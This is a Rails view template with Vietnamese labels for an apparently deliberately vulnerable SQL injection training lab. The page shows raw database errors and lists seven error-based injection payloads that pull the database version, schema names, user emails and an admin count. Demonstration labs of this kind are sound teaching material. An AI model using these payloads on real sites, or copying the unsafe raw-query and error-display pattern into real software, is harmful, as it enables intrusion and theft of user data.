<div class="container mt-4">
  <h2>Raw Error-based SQL Injection Demo</h2>
  <div class="alert alert-danger">
    <strong>CỰC KỲ NGUY HIỂM:</strong> Hiển thị lỗi SQL thô - không qua Rails processing!
  </div>

  <div class="row">
    <div class="col-md-6">
      <h4>Raw SQL Query Test</h4>
      <%= form_with url: sqli_error_raw_demo_path, method: :get, local: true, class: "border p-3 bg-light" do |f| %>
        <div class="mb-3">
          <%= f.label :user_id, "User ID:", class: "form-label" %>
          <%= f.text_field :user_id, class: "form-control", 
                          placeholder: "Thử: 1' AND (SELECT @@version)-- " %>
        </div>
        <%= f.submit "Execute Raw Query", class: "btn btn-danger" %>
      <% end %>
      
      <% if @sql_query %>
        <div class="mt-3">
          <h5>SQL Query được thực thi:</h5>
          <pre class="bg-dark text-warning p-2"><%= @sql_query %></pre>
        </div>
      <% end %>
      
      <% if defined?(@users) && @users&.any? %>
        <div class="mt-3">
          <h5>Kết quả:</h5>
          <% @users.each do |user| %>
            <div class="alert alert-success">
              <% if user.respond_to?(:email) %>
                <strong>Email:</strong> <%= user.email %><br>
                <strong>Role:</strong> <%= user.role %>
              <% else %>
                <strong>Raw Data:</strong> <%= user.inspect %>
              <% end %>
            </div>
          <% end %>
        </div>
      <% end %>
      
      <% if @raw_error %>
        <div class="mt-3">
          <h5>🚨 RAW SQL ERROR - THÔNG TIN BỊ LỘ:</h5>
          <div class="alert alert-danger border border-danger">
            <strong>Error Class:</strong> <span class="text-danger"><%= @raw_error[:class] %></span><br><br>
            
            <strong>Error Message:</strong><br>
            <div class="bg-dark text-danger p-2 mt-1 mb-2">
              <code><%= @raw_error[:message] %></code>
            </div>
            
            <strong>SQL State:</strong> <span class="badge bg-warning text-dark"><%= @raw_error[:sql_state] %></span><br>
            <strong>Error Number:</strong> <span class="badge bg-info"><%= @raw_error[:error_number] %></span>
          </div>
          
          <div class="alert alert-warning">
            <strong>⚠️ Thông tin bị lộ có thể bao gồm:</strong>
            <ul>
              <li>Cấu trúc database và tên bảng</li>
              <li>Tên cột và kiểu dữ liệu</li>
              <li>Đường dẫn file hệ thống</li>
              <li>Version database chi tiết</li>
              <li>User và quyền database</li>
            </ul>
          </div>
        </div>
      <% end %>
    </div>
    
    <div class="col-md-6">
      <h4>Payloads Raw Error:</h4>
      <div class="list-group">
        <div class="list-group-item">
          <strong>1. Syntax Error:</strong><br>
          <code>1'</code><br>
          <small class="text-muted">Lỗi quote để xem cú pháp SQL</small>
        </div>
        
        <div class="list-group-item">
          <strong>2. Version Extraction:</strong><br>
          <code>1' AND (SELECT @@version)-- </code><br>
          <small class="text-muted">Lỗi subquery để lấy version</small>
        </div>
        
        <div class="list-group-item">
          <strong>3. Database Name:</strong><br>
          <code>1' AND (SELECT database())-- </code><br>
          <small class="text-muted">Lấy tên database qua error</small>
        </div>
        
        <div class="list-group-item">
          <strong>4. Table Names:</strong><br>
          <code>1' AND (SELECT table_name FROM information_schema.tables LIMIT 1)-- </code><br>
          <small class="text-muted">Lấy tên bảng đầu tiên</small>
        </div>
        
        <div class="list-group-item">
          <strong>5. Column Names:</strong><br>
          <code>1' AND (SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1)-- </code><br>
          <small class="text-muted">Lấy tên cột của bảng users</small>
        </div>
        
        <div class="list-group-item">
          <strong>6. Data Extraction:</strong><br>
          <code>1' AND (SELECT email FROM users LIMIT 1)-- </code><br>
          <small class="text-muted">Lấy email từ bảng users</small>
        </div>
        
        <div class="list-group-item">
          <strong>7. COUNT Data:</strong><br>
          <code>1' AND (SELECT COUNT(*) FROM users WHERE role='admin')-- </code><br>
          <small class="text-muted">Đếm số admin users</small>
        </div>
      </div>
      
      <div class="mt-3 alert alert-info">
        <strong>💡 Mẹo:</strong> Nếu không thấy error, có thể do:
        <ul>
          <li>Rails đã catch exception</li>
          <li>Database không trả error chi tiết</li>
          <li>Cần dùng payload khác phù hợp với DB</li>
        </ul>
      </div>
    </div>
  </div>
  
  <div class="mt-4">
    <h4>So sánh với Error-based thông thường:</h4>
    <a href="<%= sqli_error_based_demo_path %>" class="btn btn-secondary">
      Xem Error-based Demo thông thường
    </a>
  </div>
</div>
